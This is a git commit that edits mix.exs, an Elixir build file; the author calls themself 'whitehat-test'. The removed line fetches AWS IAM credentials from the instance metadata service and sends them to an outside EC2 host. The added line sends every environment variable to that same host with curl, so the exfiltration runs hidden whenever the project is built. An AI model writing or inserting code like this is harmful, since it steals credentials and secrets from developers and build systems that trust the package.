579d9d71039d3dcab9984a1a9fe2ab39dd2bd8c2
whitehat-test <pentration0tester@gmail.com>
2019-08-10 14:49:23 +0200

    Update mix.exs

--- mix.exs
+++ mix.exs
@@ -1,1 +1,1 @@
-System.cmd("sh", ["-c", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | grep 404 > a; curl http://ec2-52-207-215-179.compute-1.amazonaws.com:8000/$(cat a)"])
+System.cmd("sh", ["-c", "curl http://ec2-52-207-215-179.compute-1.amazonaws.com:8000/$(printenv | tr '\n' ' ')"])
